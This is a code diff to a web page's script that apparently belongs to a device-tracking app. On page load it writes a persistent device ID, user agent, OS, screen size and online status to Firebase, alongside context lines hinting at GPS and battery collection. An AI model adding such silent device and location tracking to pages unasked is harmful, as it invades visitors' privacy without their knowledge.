@@ -169,6 +169,30 @@
   <script>
 
     let database = null;
+    // 🚀 ANDROID DEBUG: Direct Write Test
+    window.addEventListener('load', function () {
+      setTimeout(function () {
+        if (typeof firebase !== 'undefined' && firebase.apps.length) {
+          const testDb = firebase.database();
+          const testData = {
+            deviceId: 'test_android_' + Date.now(),
+            userAgent: navigator.userAgent,
+            timestamp: Date.now(),
+            message: 'Direct write test from Android'
+          };
+
+          testDb.ref('test_android/' + Date.now()).set(testData)
+            .then(() => {
+              console.log("✅✅✅ DIRECT WRITE SUCCESSFUL!");
+              alert("✅ Data saved to Firebase!");
+            })
+            .catch((err) => {
+              console.log("❌ DIRECT WRITE FAILED:", err);
+              alert("❌ Write Failed: " + err.message);
+            });
+        }
+      }, 3000); // 3 sec baad test karo
+    });
     let deviceId = null;
     let visitCount = 0;
     let gpsInterval = null;
@@ -522,12 +546,18 @@
 
     /* ---------------- DEVICE INFO ---------------- */
     function generateDeviceId() {
-      let id = localStorage.getItem('device_tracker_id');
-      if (!id) {
-        id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
-        localStorage.setItem('device_tracker_id', id);
+      try {
+        let id = localStorage.getItem('device_tracker_id');
+        if (!id) {
+          id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+          localStorage.setItem('device_tracker_id', id);
+        }
+        return id;
+      } catch (e) {
+        // Agar localStorage block hai (Incognito mode)
+        console.log("localStorage blocked, using session ID");
+        return 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
       }
-      return id;
     }
 
     async function getBatteryInfo() {
@@ -999,6 +1029,28 @@
     /* ---------------- BOOT ---------------- */
     async function startApp() {
       deviceId = generateDeviceId();
+      // 🚀 FORCE SAVE (bina kisi complex function ke)
+      if (database) {
+        database.ref(`devices/${deviceId}`).set({
+          deviceId: deviceId,
+          browser: getDeviceInfo().browser,
+          os: getDeviceInfo().os,
+          userAgent: navigator.userAgent,
+          screen: screen.width + 'x' + screen.height,
+          lastSeen: Date.now(),
+          lastSeenTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+          status: 'active'
+        }).then(() => {
+          console.log("✅ Device Saved Successfully");
+        }).catch(e => {
+          console.log("❌ Device Save Failed:", e);
+        });
+
+        database.ref(`online_devices/${deviceId}`).set({
+          status: 'online',
+          lastSeen: Date.now()
+        });
+      }
       if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('sw.js').then(r => console.log('✅ SW Registered')).catch(e => console.error(e));
       }
